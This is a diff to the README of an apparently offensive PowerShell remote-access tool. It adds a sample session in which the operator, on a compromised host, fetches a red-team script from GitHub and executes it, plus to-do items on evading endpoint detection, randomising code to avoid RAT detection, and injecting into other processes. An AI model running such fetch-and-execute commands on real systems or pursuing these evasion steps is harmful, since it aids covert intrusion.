@@ -162,6 +162,15 @@ UserFlags    : 66049
 Disabled     : False
 LastLogin    : 8/11/2017 5:58:47 PM
 
+(x64 - 10.0.0.153:RingZer0\MrUn1k0d3r)>>> fetch https://raw.githubusercontent.com/Mr-Un1k0d3r/RedTeamPowershellScripts/master/scripts/Get-BrowserHomepage.ps1 Get-BrowserHomepage
+[+] Fetching https://raw.githubusercontent.com/Mr-Un1k0d3r/RedTeamPowershellScripts/master/scripts/Get-BrowserHomepage.ps1
+[+] Executing Get-BrowserHomepage
+
+Start Page
+----------
+https://www.ringzer0team.com/
+
+
 (x64 - 10.0.0.153:RingZer0\MrUn1k0d3r)>>> ps
 
  PID Name                       Owner                    CommandLine
@@ -194,7 +203,10 @@ Last 10 lines of log
 
 # Todo
 
-Implement in memory protection to avoid endpoint in memory detection
+* Implement in memory protection to avoid endpoint in memory detection
+* Generate random PowerShell to avoid RAT detection
+* Implement different delivery methods
+* Inject the PowerShell RAT into another process
 
 # Credit 
 Mr.Un1k0d3r RingZer0 Team 2017
